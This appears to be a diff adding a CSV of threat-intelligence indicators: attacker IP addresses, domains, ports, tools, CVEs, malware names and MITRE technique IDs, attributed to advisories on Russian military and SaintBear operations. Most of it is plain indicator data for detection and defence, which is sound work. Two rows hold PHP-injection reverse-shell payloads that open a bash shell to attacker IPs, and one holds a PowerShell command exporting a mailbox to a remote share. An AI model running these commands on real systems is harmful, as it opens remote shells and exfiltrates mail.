@@ -1,0 +1,159 @@
+Attack / Operation / Campaign,Year of attack,IoC Class,IoC Type,IoC Subtype,Indicator,Source of info
+,,Network,IP address,,5.226.139.66,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,45.141.87.11,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,46.101.242.222,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,62.173.140.223,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,79.124.8.66,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,90.131.156.107,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,112.51.253.153,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,112.132.218.45,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,154.21.20.82,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.133.202,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.142.42,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.162.55,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.175.38,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.175.108,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.176.60,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.187.47,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,179.43.189.218,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,185.245.84.227,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,185.245.85.251,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,194.26.29.84,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,194.26.29.95,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,194.26.29.98,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,194.26.29.251,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,IP address,,185.244.41.109,https://cert.gov.ua/article/18419
+,,General,Software,,Acunetix,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Amass,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Droopescan,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,JoomScan,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,MASSCAN,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Netcat,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Nmap,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Shodan,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,VirusTotal,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,WPScan,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,OpenVPN ,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Adminer ,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Impacket,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,ldapdomaindump ,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Vulnerability (CVE),,,CVE-2021-33044,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Vulnerability (CVE),,,CVE-2021-33045,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Vulnerability (CVE),,,CVE-2022-26134,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Vulnerability (CVE),,,CVE-2022-26138,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Vulnerability (CVE),,,CVE-2022-3236,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Domain,,interlinks.top,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Domain,,3proxy.ru,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Domain,,ngrok.com,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Domain,,cdn.discordapp.com,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1080,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1333,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,13381,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,13391,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,13666,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,13871,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1448,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1888,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,3130,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,3140,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,4337,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,50001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8079,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1234,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,1851,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,43221,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,443,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,4444,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,4688,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,5432,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8080,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8081,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8082,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8084,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8085,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8088,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8089,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8090,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8443,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8487,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Network,Port,,8888,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,psexec.py,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,secretsdump.py,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Malware,,Raspberry Robin,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Malware,,SaintBot,https://cert.gov.ua/article/18419
+,,General,Malware,,OutSteel ,https://cert.gov.ua/article/18419
+,,Host,cmd line,,"${@print(system(""bash -i >& /dev/tcp/179.43.175.38/6870 0>&1""))}",https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,"${@print(system(""bash -i >& /dev/tcp/81.17.24.130/6870 0>&1""))}",https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,ntlmrelayx.py,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,krbrelayx.py,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,su-bruteforce,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,Responder.py,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,LinPEAS,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,Software,,Metasploit,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,cmd line,,powershell New-MailboxExportRequest – Mailbox <resource> – FilePath `\\{IP Address}\sharefolder\1.pst`,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,Programming language,,PowerShell,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,Programming language,,PHP,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,Host,Programming language,,VBS,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+,,General,MITRE Sub-technique,,T1590.002,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1595,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1595.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1595.002,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1596.005,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1583.003,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1588.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1588.005,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1078.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1190,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1059.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1505.003,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1003.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1003.002,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1110.003,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1552.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1046,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1654,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1550.002,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1114,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1125,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1213.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1560,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1090.003,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1071.001,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1071.004,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1095,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1105,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Technique,,T1572,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+,,General,MITRE Sub-technique,,T1567.002,https://media.defense.gov/2024/Sep/05/2003537870/-1/-1/1/CSA-Russian-Military-Cyber-Target-US-Global-CI.PDF
+Заборгованість по зарплаті.xls,2022,Network,URL,,https://194.31.98.124:443/i,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,Network,URL,,https://194.31.98.124:443/p,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,Network,URL,,https://194.31.98.124:443/m,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,Network,URL,,ws://194.31.98.124:443/c,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,Network,IP address,,194.31.98.124,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,MITRE Sub-technique,,T1566.001,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,MITRE Sub-technique,,T1204.002,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,MITRE Sub-technique,,T1059.005,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,MITRE Technique,,T1568,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,Malware,,GraphSteel,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,Malware,,GrimPlant,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+Заборгованість по зарплаті.xls,2022,General,Malware,,Elephant ,https://www.nioguard.com/2022/04/russian-saintbear-group-attacked.html
+,,General,MITRE Sub-technique,,T1059.001,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1059.003,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1059.007,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Technique,,T1203,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1562.001,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Technique,,T1105,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Technique,,T1112,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Technique,,T1027,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1027.001,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1027.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1027.010,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1588.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1588.003,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1566.001,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1566.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1553.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1218.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1204.001,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Sub-technique,,T1204.002,https://attack.mitre.org/groups/G1003/
+,,General,MITRE Technique,,T1102,https://attack.mitre.org/groups/G1003/
+,,General,Vulnerability (CVE),,CVE-2017-11882,https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/
